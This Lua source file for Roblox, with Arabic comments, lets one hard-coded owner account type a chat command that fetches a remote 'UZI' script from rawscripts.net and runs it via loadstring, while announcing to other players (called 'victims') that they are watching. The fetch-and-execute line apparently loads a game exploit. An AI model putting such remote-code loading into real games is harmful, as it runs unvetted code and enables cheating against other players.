local _G = {
    ControllerID = 9822837105, -- الأونر الوحيد
    CommandCooldown = {} -- منع التكرار
}

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

-- الرابط الخاص بالسكربت
local UZI_SCRIPT_URL = "https://rawscripts.net/raw/Universal-Script-TXT-DEV-UZI-43276"

-- دالة للتحقق إذا كان اللاعب هو الأونر
local function isOwner(player)
    return player.UserId == _G.ControllerID
end

-- دالة لإرسال إشعار للاعب
local function notifyPlayer(player, message)
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "نظام UZI",
            Text = message,
            Icon = "rbxassetid://0",
            Duration = 5
        })
    end)
end

-- دالة لإرسال رسالة للجميع
local function broadcastMessage(message)
    for _, player in ipairs(Players:GetPlayers()) do
        pcall(function()
            game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
                Text = message,
                Color = Color3.new(1, 0, 0),
                Font = Enum.Font.SourceSansBold,
                FontSize = Enum.FontSize.Size18
            })
        end)
    end
end

-- دالة منع التكرار
local function checkCooldown(player)
    if _G.CommandCooldown[player.UserId] and os.time() - _G.CommandCooldown[player.UserId] < 10 then
        notifyPlayer(player, "⏳ انتظر 10 ثواني بين كل أمر")
        return false
    end
    _G.CommandCooldown[player.UserId] = os.time()
    return true
end

-- دالة لتفعيل سكربت UZI للأونر
local function activateUziScript(player)
    if not player or not player.Character then
        return false
    end
    
    print("🎯 محاولة تحميل سكربت UZI للأونر: "..player.Name)
    
    -- إشعار للجميع أن الأونر شغل السكربت
    broadcastMessage("🔫 [" .. player.Name .. "] قام بتشغيل سكربت UZI!")
    
    local success, error = pcall(function()
        -- تحميل وتنفيذ السكربت
        loadstring(game:HttpGet(UZI_SCRIPT_URL))()
    end)
    
    if success then
        print("✅ تم تحميل سكربت UZI بنجاح للأونر: "..player.Name)
        notifyPlayer(player, "🔫 تم تفعيل UZI بنجاح!")
        
        -- إشعار للضحايا
        for _, victim in ipairs(Players:GetPlayers()) do
            if not isOwner(victim) then
                notifyPlayer(victim, "👀 [" .. player.Name .. "] قام بتشغيل UZI - شاهد ما يفعله!")
            end
        end
        
        return true
    else
        print("❌ فشل في تحميل سكربت UZI: "..error)
        notifyPlayer(player, "❌ فشل في تحميل UZI: "..error)
        return false
    end
end

-- دالة لإنشاء تأثيرات بصرية للضحايا لمشاهدة الأونر
local function createSpectatorEffects(owner)
    -- تأثير ضوء حول الأونر
    local highlight = Instance.new("Highlight")
    highlight.Name = "OwnerHighlight"
    highlight.FillColor = Color3.new(1, 0, 0)
    highlight.OutlineColor = Color3.new(1, 1, 0)
    highlight.FillTransparency = 0.7
    highlight.OutlineTransparency = 0
    highlight.Parent = owner.Character
    
    -- بيلبورد للإعلان
    local billboard = Instance.new("BillboardGui")
    billboard.Name = "OwnerBillboard"
    billboard.Size = UDim2.new(0, 200, 0, 50)
    billboard.StudsOffset = Vector3.new(0, 3, 0)
    billboard.Adornee = owner.Character:FindFirstChild("Head")
    billboard.Parent = owner.Character
    
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.Text = "🔫 الأونر - يشغل UZI 🔫"
    label.TextColor3 = Color3.new(1, 0, 0)
    label.TextScaled = true
    label.BackgroundTransparency = 1
    label.Font = Enum.Font.SourceSansBold
    label.Parent = billboard
    
    -- إشعار للضحايا
    for _, victim in ipairs(Players:GetPlayers()) do
        if not isOwner(victim) then
            notifyPlayer(victim, "👀 الآن تشاهد [" .. owner.Name .. "] وهو يستخدم UZI!")
        end
    end
end

-- دالة لإزالة التأثيرات
local function removeSpectatorEffects(owner)
    if owner and owner.Character then
        local highlight = owner.Character:FindFirstChild("OwnerHighlight")
        if highlight then
            highlight:Destroy()
        end
        
        local billboard = owner.Character:FindFirstChild("OwnerBillboard")
        if billboard then
            billboard:Destroy()
        end
    end
end

-- دالة معالجة الأوامر
local function processCommand(player, message)
    local command = message:lower()
    
    if not checkCooldown(player) then return end
    
    -- إذا كان الأونر
    if isOwner(player) then
        if command == "!u" then
            print("🎯 الأونر يحاول تشغيل UZI: "..player.Name)
            
            -- تفعيل التأثيرات البصرية
            createSpectatorEffects(player)
            
            -- تحميل السكربت
            local success = activateUziScript(player)
            
            if success then
                -- إشعار تأكيد إضافي
                delay(2, function()
                    broadcastMessage("🎮 [" .. player.Name .. "] يتحكم الآن بـ UZI - شاهدوا العرض!")
                end)
            end
            
        elseif command == "!ustop" then
            -- إيقاف العرض
            removeSpectatorEffects(player)
            notifyPlayer(player, "🛑 تم إيقاف وضع العرض")
            broadcastMessage("🛑 [" .. player.Name .. "] توقف عن استخدام UZI")
        end
        
    -- إذا كان لاعب عادي
    else
        if command == "!u" then
            notifyPlayer(player, "❌ فقط الأونر يمكنه تشغيل UZI")
            notifyPlayer(player, "👀 يمكنك مشاهدة الأونر عندما يستخدمه!")
        end
    end
end

-- ========== بدء النظام ==========
local function monitorPlayer(player)
    player.Chatted:Connect(function(message)
        local cmd = message:lower()
        if cmd == "!u" or cmd == "!ustop" then
            processCommand(player, message)
        end
    end)
end

local function startMonitoring()
    for _, player in ipairs(Players:GetPlayers()) do
        monitorPlayer(player)
    end
end

-- عند دخول لاعب جديد
Players.PlayerAdded:Connect(function(player)
    print("👤 لاعب جديد: "..player.Name.." ("..player.UserId..")")
    monitorPlayer(player)
    
    if isOwner(player) then
        print("⭐ الأونر دخل اللعبة! (9822837105)")
        notifyPlayer(player, "🎮 أنت الأونر! اكتب !U لتشغيل UZI")
        notifyPlayer(player, "👀 الجميع سيشاهدك عندما تستخدمه!")
    else
        notifyPlayer(player, "👀 انتظر الأونر ليشغل UZI وسوف تشاهد العرض!")
    end
end)

-- عند خروج لاعب
Players.PlayerRemoving:Connect(function(player)
    if isOwner(player) then
        removeSpectatorEffects(player)
        broadcastMessage("🚪 الأونر غادر اللعبة")
    end
end)

-- عند موت الأونر
local function onOwnerDied(owner)
    if owner and owner.Character then
        owner.Character:WaitForChild("Humanoid").Died:Connect(function()
            removeSpectatorEffects(owner)
            delay(3, function()
                if owner.Character then
                    createSpectatorEffects(owner)
                end
            end)
        end)
    end
end

-- البدء
print("🔫 نظام UZI المشاهد مفعل!")
print("🎮 الأونر الوحيد: 9822837105")
print("📜 سكربت UZI: "..UZI_SCRIPT_URL)

startMonitoring()

-- إعداد الأونر الحالي
local localPlayer = Players.LocalPlayer
if localPlayer and isOwner(localPlayer) then
    notifyPlayer(localPlayer, "🎮 اكتب !U لتشغيل UZI")
    notifyPlayer(localPlayer, "👀 الجميع سيشاهدك عندما تستخدمه!")
    
    -- مراقبة موت الأونر
    if localPlayer.Character then
        onOwnerDied(localPlayer)
    end
    localPlayer.CharacterAdded:Connect(function()
        onOwnerDied(localPlayer)
    end)
else
    notifyPlayer(localPlayer, "👀 انتظر الأونر ليشغل UZI!")
end

return {
    -- دالة يدوية لتشغيل UZI
    activateUzi = function(targetPlayer)
        if targetPlayer and isOwner(targetPlayer) then
            return activateUziScript(targetPlayer)
        end
        return false
    end,
    
    -- دالة يدوية للتأثيرات البصرية
    startSpectatorMode = function(owner)
        if owner and isOwner(owner) then
            createSpectatorEffects(owner)
            return true
        end
        return false
    end,
    
    -- دالة يدوية لإيقاف العرض
    stopSpectatorMode = function(owner)
        if owner then
            removeSpectatorEffects(owner)
            return true
        end
        return false
    end,
    
    -- معلومات
    isOwner = isOwner,
    getInfo = function()
        return {
            OwnerID = _G.ControllerID,
            ScriptURL = UZI_SCRIPT_URL,
            TotalPlayers = #Players:GetPlayers(),
            IsOwner = isOwner(Players.LocalPlayer)
        }
    end
}
